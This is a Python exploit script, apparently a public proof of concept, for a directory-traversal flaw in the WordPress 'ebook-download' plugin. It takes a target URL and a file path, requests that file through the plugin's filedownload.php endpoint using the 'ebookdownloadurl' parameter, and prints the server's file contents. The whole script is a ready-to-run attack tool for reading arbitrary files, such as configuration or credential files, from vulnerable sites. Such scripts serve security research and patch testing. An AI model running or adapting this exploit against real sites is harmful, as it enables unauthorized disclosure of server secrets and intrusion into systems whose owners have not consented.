# Wordpress plugin - ebook-download - Directory traversal
# Coded by Nehal Zaman (@pwnersec)

from banner import banner
from termcolor import colored
import requests
import sys


END_POINT = "/wp-content/plugins/ebook-download/filedownload.php"
PROXY = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}
EXTRA_DATA = "<script>window.close()</script>"


def parse_response(r, s):
	return r.text.replace(s, "").replace(EXTRA_DATA, "")


def make_http_request(url, payload):
	
	param = {
		"ebookdownloadurl": payload
	}
	#return requests.get(f"{url}{END_POINT}", params=param, proxies=PROXY)
	return requests.get(f"{url}{END_POINT}", params=param)


def get_file_contents(url, file):

	resp = make_http_request(url, file)
	return parse_response(resp, file)


if __name__ == '__main__':
	
	if len(sys.argv) != 3:
		print(colored(f"USAGE {sys.argv[0]} <URL> <file-to-read>", "red"))
		sys.exit(1)

	print(colored(banner, "yellow"))

	url = sys.argv[1]
	file = sys.argv[2]

	output = get_file_contents(url, file)

	print(colored("="*80, "blue"))
	print(output)
	print(colored("="*80, "blue"))